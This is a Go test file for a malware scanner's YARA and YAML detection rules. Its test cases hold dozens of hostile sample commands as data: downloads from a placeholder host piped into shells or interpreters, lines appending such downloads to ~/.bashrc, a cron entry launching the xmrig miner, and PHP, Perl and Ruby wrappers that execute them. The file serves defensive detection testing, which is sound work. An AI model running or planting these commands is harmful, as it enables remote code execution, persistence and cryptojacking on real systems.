//go:build yara

package yara_test

import (
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func loadDownloadRuleScanners(t *testing.T) (*csmyara.Scanner, *signatures.Scanner) {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}
	return yaraScanner, yamlScanner
}

// The download and miner rules look for their parts within a bounded span of
// one line. These cases pin what that span still covers in both engines.
func TestDownloadRuleSpansBothEngines(t *testing.T) {
	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
	tests := []struct {
		name     string
		yamlRule string
		yaraRule string
		ext      string
		sample   string
		want     bool
	}{
		{
			name:     "download command after a long code prefix",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".php",
			sample:   "<?php $pad = '" + strings.Repeat("x", 5000) + "'; system('curl http://payload.example.test/p | sh');\n",
			want:     true,
		},
		{
			name:     "download command after other commands on its line",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".sh",
			sample:   "cd /tmp; wget http://payload.example.test/b -O b; curl http://payload.example.test/p | sh\n",
			want:     true,
		},
		{
			name:     "long usage comment naming an installer",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".sh",
			sample:   "# " + strings.Repeat("word ", 40) + "curl https://get.example.test/install.sh | sh\n",
		},
		{
			name:     "miner release download",
			yamlRule: "miner_shell_script",
			yaraRule: "miner_shell_downloader",
			ext:      ".sh",
			sample:   "#!/bin/sh\nwget -q -O /tmp/.cache/k https://downloads.example.test/releases/v6.21.0/static/linux-x64/xmrig-6.21.0-linux-static-x64.tar.gz\n",
			want:     true,
		},
		{
			name:     "cron entry starting a miner",
			yamlRule: "miner_cron_persistence",
			yaraRule: "miner_cron_persistence",
			ext:      ".sh",
			sample:   "*/10 * * * * /tmp/.x/xmrig --config /tmp/.x/c.json >/dev/null 2>&1\n",
			want:     true,
		},
		{
			name:     "download appended to a startup file",
			yamlRule: "backdoor_bashrc_injection",
			yaraRule: "backdoor_bashrc_injection",
			ext:      ".bashrc",
			sample:   "echo 'curl http://payload.example.test/x.sh | bash' >> ~/.bashrc\n",
			want:     true,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			content := []byte(tc.sample)
			matches, err := yaraScanner.ScanBytesChecked(content)
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, tc.yaraRule); got != tc.want {
				t.Errorf("YARA %s matched = %t, want %t", tc.yaraRule, got, tc.want)
			}
			if got := hasSignatureRule(yamlScanner.ScanContent(content, tc.ext), tc.yamlRule); got != tc.want {
				t.Errorf("YAML %s matched = %t, want %t", tc.yamlRule, got, tc.want)
			}
		})
	}
}

// Markdown suppression exists only in the YARA rules. A command counts as
// documentation only inside a fenced block or as link text.
func TestDownloadRuleMarkdownSpans(t *testing.T) {
	yaraScanner, _ := loadDownloadRuleScanners(t)
	fencedRC := "```sh\necho 'curl https://get.example.test/a | bash' >> ~/.bashrc\n```\n"
	tests := []struct {
		name   string
		rule   string
		sample string
		want   bool
	}{
		{
			name:   "command in an indented fenced block",
			rule:   "dropper_wget_exec",
			sample: "1. Install:\n\n    ```sh\n    curl -fsSL https://get.example.test/a | sh\n    ```\n",
		},
		{
			name:   "command in a longer backtick fence",
			rule:   "dropper_wget_exec",
			sample: "````sh\ncurl -fsSL https://get.example.test/a | sh\n````\n",
		},
		{
			name:   "command in a fenced block with CRLF lines",
			rule:   "dropper_wget_exec",
			sample: "```sh\r\ncurl -fsSL https://get.example.test/a | sh\r\n```\r\n",
		},
		{
			name:   "command on the opening line of a fence",
			rule:   "dropper_wget_exec",
			sample: "```curl http://payload.example.test/p | sh\n```\n",
			want:   true,
		},
		{
			name:   "command after a closing fence on the same line",
			rule:   "dropper_wget_exec",
			sample: "```sh\n:\n```curl http://payload.example.test/p | sh\n",
			want:   true,
		},
		{
			name:   "command before fenced documentation",
			rule:   "dropper_wget_exec",
			sample: "curl http://payload.example.test/p | bash\n\n```sh\ncurl -fsSL https://get.example.test/a | sh\n```\n",
			want:   true,
		},
		{
			name:   "command after many fenced blocks",
			rule:   "dropper_wget_exec",
			sample: strings.Repeat("```sh\ncurl -fsSL https://get.example.test/a | sh\n```\n\n", 50) + "curl http://payload.example.test/p | bash\n",
			want:   true,
		},
		{
			name:   "command after a link line",
			rule:   "dropper_wget_exec",
			sample: "[curl -fsSL https://get.example.test/a | sh](https://get.example.test/)\ncurl http://payload.example.test/p | bash\n",
			want:   true,
		},
		{
			name:   "startup-file command in a fenced block",
			rule:   "backdoor_bashrc_injection",
			sample: fencedRC,
		},
		{
			name:   "startup-file command after fenced documentation",
			rule:   "backdoor_bashrc_injection",
			sample: fencedRC + "echo 'curl http://payload.example.test/x.sh | bash' >> ~/.bashrc\n",
			want:   true,
		},
		{
			// Suppression is not examined in a file with more Markdown spans
			// than any published document carries, so its cost stays linear.
			name:   "startup-file commands in an oversized document",
			rule:   "backdoor_bashrc_injection",
			sample: strings.Repeat(fencedRC, 1001),
			want:   true,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			matches, err := yaraScanner.ScanBytesChecked([]byte(tc.sample))
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, tc.rule); got != tc.want {
				t.Errorf("%s matched = %t, want %t", tc.rule, got, tc.want)
			}
		})
	}
}

// A download counts as executed only when it is piped into a whole shell or
// interpreter name. Longer names that start the same way are other tools.
func TestDownloadRuleShellTarget(t *testing.T) {
	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
	const dropper = "dropper_wget_exec"
	const startup = "backdoor_bashrc_injection"
	tests := []struct {
		name   string
		rule   string
		ext    string
		sample string
		want   bool
	}{
		{name: "checksum of a download", rule: dropper, ext: ".sh", sample: "curl -fsSL https://downloads.example.test/tool.tar.gz | sha256sum\n"},
		{name: "checksum tool after a download", rule: dropper, ext: ".sh", sample: "wget -qO- https://downloads.example.test/tool.tar.gz | shasum -a 256\n"},
		{name: "formatter named like an interpreter", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a.pl | perltidy -st\n"},
		{name: "tool name joined by a hyphen", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh-check\n"},
		{name: "script name with an extension", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh.php\n"},
		{name: "directory named like a shell", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh/run\n"},
		{name: "assignment named like a shell", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh=1\n"},
		{name: "tool name joined by a plus", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh+helper\n"},
		{name: "tool name joined by a colon", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | bash:helper\n"},
		{name: "tool name with a Unicode suffix", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | sh\u00e9\n"},
		{name: "Unicode lookalike shell name", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | \u017fh\n"},
		{name: "Unicode lookalike startup command", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\ncurl https://downloads.example.test/a | ba\u017fh\n"},
		{name: "interpreter name with only dots", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | python..\n"},
		{name: "interpreter name with a trailing dot", rule: dropper, ext: ".sh", sample: "curl -s https://downloads.example.test/a | perl5.38.\n"},
		{name: "shell with arguments", rule: dropper, ext: ".sh", sample: "curl -fsSL http://payload.example.test/p | sh -s -- --quiet\n", want: true},
		{name: "versioned interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3 -\n", want: true},
		{name: "interpreter with minor version at line end", rule: dropper, ext: ".sh", sample: "wget -qO- http://payload.example.test/p | python3.11\n", want: true},
		{name: "interpreter at end of file", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | perl", want: true},
		{name: "free-threaded Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3.13t\n", want: true},
		{name: "debug Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3.11d\n", want: true},
		{name: "pymalloc Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3.7m\n", want: true},
		{name: "Unicode pymalloc Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python2.7mu\n", want: true},
		{name: "debug free-threaded Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3.13td\n", want: true},
		{name: "distribution debug Python interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | python3.11-dbg\n", want: true},
		{name: "Windows shell executable", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | sh.exe'); ?>", want: true},
		{name: "Windows Perl executable", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | perl.exe'); ?>", want: true},
		{name: "Windows Python executable", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | python.exe'); ?>", want: true},
		{name: "Windows GUI Python interpreter", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | pythonw.exe'); ?>", want: true},
		{name: "Windows debug Python interpreter", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | python_d.exe'); ?>", want: true},
		{name: "Windows debug GUI Python interpreter", rule: dropper, ext: ".php", sample: "<?php system('curl http://payload.example.test/p | pythonw_d.exe'); ?>", want: true},
		{name: "versioned Perl interpreter", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | perl5.38.0\n", want: true},
		{name: "CRLF after a shell", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | bash\r\n", want: true},
		{name: "vertical tab before a shell", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p |\vsh\n", want: true},
		{name: "vertical tab after a downloader", rule: dropper, ext: ".sh", sample: "curl\vhttp://payload.example.test/p | sh\n", want: true},
		{name: "adjacent redirection after a shell", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | bash>/dev/null\n", want: true},
		{name: "expanded arguments after a shell", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p | sh${IFS}-s\n", want: true},
		{name: "pipeline continued on the next line", rule: dropper, ext: ".sh", sample: "curl http://payload.example.test/p |\n  bash\n", want: true},
		{name: "command substitution", rule: dropper, ext: ".sh", sample: "x=$(curl http://payload.example.test/p | bash)\n", want: true},
		{name: "double-quoted PHP string", rule: dropper, ext: ".php", sample: "<?php system(\"curl http://payload.example.test/p | bash\"); ?>\n", want: true},
		{name: "escaped newline in a PHP string", rule: dropper, ext: ".php", sample: "<?php $c = \"wget -qO- http://payload.example.test/p | sh\\n\"; shell_exec($c);\n", want: true},
		{name: "PHP backtick operator", rule: dropper, ext: ".php", sample: "<?php echo `curl http://payload.example.test/p | sh`;\n", want: true},
		{name: "Perl braced command operator", rule: dropper, ext: ".pl", sample: "my $out = qx{curl http://payload.example.test/p | sh};\n", want: true},
		{name: "Ruby bracketed command literal", rule: dropper, ext: ".rb", sample: "out = %x[curl http://payload.example.test/p | sh]\n", want: true},
		{name: "NUL-terminated string in a binary", rule: dropper, ext: "", sample: "\x7fELF\x02\x01\x01\x00curl http://payload.example.test/p | sh\x00", want: true},
		{name: "checksum helper in a startup file", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\nsumurl() { curl -fsSL \"$1\" | sha256sum; }\n"},
		{name: "punctuation in a startup helper name", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\ncurl https://downloads.example.test/a | sh+helper\n"},
		{name: "mixed-case startup command", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\nCURL http://payload.example.test/p | SH\n", want: true},
		{name: "startup download without arguments", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\ncurl | sh\n", want: true},
		{name: "Windows startup shell executable", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\ncurl http://payload.example.test/p | bash.exe\n", want: true},
		{name: "download run from a startup file", rule: startup, ext: ".bashrc", sample: "# ~/.bashrc\ncurl -fsSL http://payload.example.test/x | bash\n", want: true},
		{name: "download run at end of a profile", rule: startup, ext: ".profile", sample: "# ~/.profile\nwget -qO- http://payload.example.test/x | sh", want: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			content := []byte(tc.sample)
			matches, err := yaraScanner.ScanBytesChecked(content)
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, tc.rule); got != tc.want {
				t.Errorf("YARA %s matched = %t, want %t", tc.rule, got, tc.want)
			}
			if got := hasSignatureRule(yamlScanner.ScanContent(content, tc.ext), tc.rule); got != tc.want {
				t.Errorf("YAML %s matched = %t, want %t", tc.rule, got, tc.want)
			}
		})
	}
}

func TestDownloadRuleShellTargetDelimiters(t *testing.T) {
	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
	endings := []struct {
		name   string
		suffix string
		want   bool
	}{
		{"end of file", "", true},
		{"arguments", " -s", true},
		{"tab", "\t-s", true},
		{"CRLF", "\r\n", true},
		{"NUL", "\x00", true},
		{"single quote", "'); ?>", true},
		{"double quote", "\"); ?>", true},
		{"backtick", "`;", true},
		{"escaped newline", "\\n\";", true},
		{"semicolon", "; echo done", true},
		{"conjunction", "&& echo done", true},
		{"pipe", "| cat", true},
		{"redirection", ">/dev/null", true},
		{"substitution", ")", true},
		{"expanded arguments", "${IFS}-s", true},
		{"closing brace", "}", true},
		{"closing bracket", "]", true},
		{"plus", "+helper", false},
		{"colon", ":helper", false},
		{"comma", ",helper", false},
		{"percent", "%helper", false},
		{"at sign", "@helper", false},
		{"bracket", "[helper]", false},
		{"brace", "{helper}", false},
		{"Unicode", "\u00e9", false},
		{"extension", ".php", false},
		{"path", "/run", false},
		{"hyphen", "-check", false},
		{"assignment", "=1", false},
	}
	for _, target := range []string{"bash", "sh", "perl", "perl5.38.0", "python", "python3.11", "python3.13t", "python3.7m"} {
		for _, ending := range endings {
			t.Run(target+"/"+ending.name, func(t *testing.T) {
				content := []byte("# ~/.bashrc\ncurl https://payload.example.test/p | " + target + ending.suffix)
				matches, err := yaraScanner.ScanBytesChecked(content)
				if err != nil {
					t.Fatalf("YARA scan failed: %v", err)
				}
				for _, rule := range []string{"dropper_wget_exec", "backdoor_bashrc_injection"} {
					want := ending.want && (rule == "dropper_wget_exec" || target == "bash" || target == "sh")
					if got := hasRepositoryYaraRule(matches, rule); got != want {
						t.Errorf("YARA %s matched = %t, want %t", rule, got, want)
					}
					if got := hasSignatureRule(yamlScanner.ScanContent(content, ".bashrc"), rule); got != want {
						t.Errorf("YAML %s matched = %t, want %t", rule, got, want)
					}
				}
			})
		}
	}
}
